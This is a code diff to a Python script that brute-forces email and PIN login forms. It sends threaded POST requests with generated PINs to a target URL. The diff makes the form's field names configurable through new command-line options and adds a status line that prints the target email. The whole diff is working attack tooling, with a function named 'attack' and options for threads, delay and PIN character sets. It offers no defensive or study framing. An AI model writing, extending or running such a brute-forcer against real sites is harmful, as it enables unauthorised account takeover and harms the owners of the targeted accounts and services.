@@ -9,10 +9,10 @@ import threading
 attempts = 0
 attempts_lock = threading.Lock()
 
-def attack(url, email, pin, delay, verbose):
+def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin"):
     global attempts
     session = requests.Session()
-    data = {'email': email, 'pin': pin}
+    data = {email_param: email, pin_param: pin}
 
     try:
         response = session.post(url, data=data, allow_redirects=False)
@@ -49,11 +49,14 @@ def main():
     parser.add_argument("--delay", type=float, default=0.5, help="Delay (in seconds) between attempts")
     parser.add_argument("--charset", type=str, default="0123456789", help="Character set to use for PIN generation")
     parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
+    parser.add_argument("--email-param", type=str, default="email", help="Parameter name for email")
+    parser.add_argument("--pin-param", type=str, default="pin", help="Parameter name for PIN")
     
     args = parser.parse_args()
 
 
     print(f"[*] Target URL: {args.url}")
+    print(f"[*] Using email: {args.email}")
     print(f"[*] Using email file: {args.email_file}")
     print(f"[*] Digits: {args.min_digits} to {args.max_digits}")
     print(f"[*] Threads: {args.threads}")
